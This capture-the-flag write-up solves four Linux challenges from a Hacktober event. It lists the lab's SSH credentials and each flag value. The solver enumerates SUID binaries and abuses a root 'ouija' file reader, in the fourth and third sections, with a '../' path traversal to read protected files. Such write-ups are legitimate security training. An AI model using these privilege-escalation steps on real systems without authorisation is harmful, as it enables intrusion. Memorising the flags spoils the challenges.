#### Talking to the Dead 1
DESCRIPTION
```
Talking to the Dead 1

Author: syyntax

We've obtained access to a server maintained by spookyboi. There are four flag files that we need you to read and submit (flag1.txt, flag2.txt, etc). Submit the contents of flag1.txt.

ssh hacktober@env.hacktober.io

Password: hacktober-Underdog-Truth-Glimpse

```

1. Connect to the server through SSH.
  ```   
  Last login: Mon Oct 19 04:27:08 2020 from 106.197.11.146
  luciafer@3191a213533a:/$ whoami
  luciafer
  ```
    -> We are logged in as luciafer
  
2. We need to find flag1.txt for chall 1 of Linux.
    
    -> The flag is in /home/luciafer/Documents/flag1.txt
    
  ```
  luciafer@3191a213533a:/home$ ls
  luciafer  spookyboi
  luciafer@3191a213533a:/home$ cd luciafer/
  luciafer@3191a213533a:~$ ls
  Documents  Downloads  Pictures Videos
  luciafer@3191a213533a:~$ cd Documents/
  luciafer@3191a213533a:~/Documents$ ls 
  flag1.txt
  luciafer@3191a213533a:~/Documents$ cat flag1.txt
  flag{cb07e9d6086d50ee11c0d968f1e5c4bf1c89418c}
  ```
FLAG 1: flag{cb07e9d6086d50ee11c0d968f1e5c4bf1c89418c}
-----------------------------------------------------


#### Talking to the Dead 2
DESCRIPTION
```
Talking to the Dead 2
Author: syyntax

There's a hidden flag that belongs to luciafer. Submit the contents of the hidden flag2.txt.

ssh hacktober@env.hacktober.io
Password: hacktober-Underdog-Truth-Glimpse
```
1. Connect to the SSH which is same for all the linux challenges.
2. The Description says the file belongs to "luciafer". 
3. So looking in "/home/luciafer/Documents" 
  ```
  luciafer@3191a213533a:~/Documents$ ls -al
  total 20
  drwxrwxr-x 1 luciafer luciafer 4096 Oct  6 36
  drwxr-xr-x 1 luciafer luciafer 4096 Oct  5 14:54 ..
  -rw-rw-r-- 1 luciafer luciafer   47 Oct  6 08:36 .flag2.txt
  -rw-rw-r-- 1 luciafer luciafer   47 Oct  5 14:55 flag1.txt

  luciafer@3191a213533a:~/Documents$ cat .flag2.txt
  flag{728ec98bfaa302b2dfc2f716d3de7869f3eadcbf}
  ```
  
  The flag2.txt was a hidden file so using "ls -al" to list all files hidden and otherwise.
  Reading the contents of ".flag2.txt"
  
 FLAG 2 : flag{728ec98bfaa302b2dfc2f716d3de7869f3eadcbf}
  -----------------------------------------------
 

#### Talking to the Dead 4
DESCRIPTION
```
Talking to the Dead 4
Author: syyntax

We suspect spookyboi doesn't use the root account for this server. There must be some mechanism used to read the flag4.txt file without gaining root. Submit the contents of flag4.txt from the remote machine.

ssh hacktober@env.hacktober.io
Password: hacktober-Underdog-Truth-Glimpse
```
1. Connect with the SSH port.
2. Go to root directory.
  ```
luciafer@88a08162709b:/$ cd /root
luciafer@88a08162709b:/root$ ls
core  flag4.txt
luciafer@88a08162709b:/root$ ls -al
total 272
drwxr-xr-x 1 root root   4096 Oct  6 10:50 .
drwxr-xr-x 1 root root   4096 Oct 19 00:23 ..
-rw------- 1 root root   4408 Oct  6 14:04  bash_history
-rw-r--r-- 1 root root   3106 Dec  5  2019 .bashrc
drwxr-xr-x 3 root root   4096 Oct  6 08:43 .local
-rw-r--r-- 1 root root    161 Dec  5  2019 .profile
-rw------- 1 root root      0 Oct  6 08:42 .python_history
-rw------- 1 root root 245760 Oct  6 09:58 core
-rw------- 1 root root     47 Oct  6 08:41 flag4.txt
```
3. Only root user has the permission to read and write the contentsof flag4.txt
  -> Looking aruond the system I tried finding for a file with SUID permissions as root that can help us.
  ```
luciafer@3191a213533a:~/Documents$ find / -perm -u=s -type f 2> /dev/null
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/local/bin/ouija
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
  ```

4. There is a file that stands out becase its not a common file found in a linux system. So I tried running this

```
luciafer@3191a213533a:~/Documents$ /usr/local/bin/ouija
OUIJA 6.66 - Read files in the /root directory
Usage: ouija [FILENAME]
EXAMPLES:	ouija file.txt
			ouija read.me
```
  ->This file cat's the contents of files in /root directory. ie  *cat /root/<filename>
  
```
luciafer@3191a213533a:~/Documents$ /usr/local/bin/ouija flag4.txt                                                                                                       flag{4781cbffd13df6622565d45e790b4aac2a4054dc}
```

FLAG 4 : flag{4781cbffd13df6622565d45e790b4aac2a4054dc}
---------------------------------------------------------

 
#### Talking to the Dead 3
DESCRIPTION
```
Talking to the Dead 3

Submit the contents of flag3.txt from the remote machine.

ssh hacktober@env.hacktober.io
Password: hacktober-Underdog-Truth-Glimpse

```

##### *I don't think this was the intended solution to solve this flag but I did solved it. So if you know how it was intended let'me know in my Discord @mrWh1te#3911

1. Connect through SSH to the server.

2. The challenge was to read the flag3.txt residing in the spookyboi's Documents, and is a allowed to be read by spookyboi and its group users.
   
   -> I couldn't figure out how to horizontally escalate the privilege to another user.

3. But , I know there is a file that reads the content of files with root privileges from the root directory.
   So I used */usr/local/ouija* to read the contents of *flag3.txt*

```
luciafer@8925bd5b7eeb:/home/spookyboi/Documents$ /usr/local/bin/ouija ../home/spookyboi/Documents/flag3.txt
flag{445b987b5b80e445c3147314dbfa71acd79c2b67} 
```
I used the full path because the command is run as:
cat /root/../<path> 

".." is used to specify the previous directory and thus allowing me to read the contnts of */home/spookyboi/Documents/flag3.txt*.

FLAG 3 : flag{445b987b5b80e445c3147314dbfa71acd79c2b67} 
-----------------------------------------------
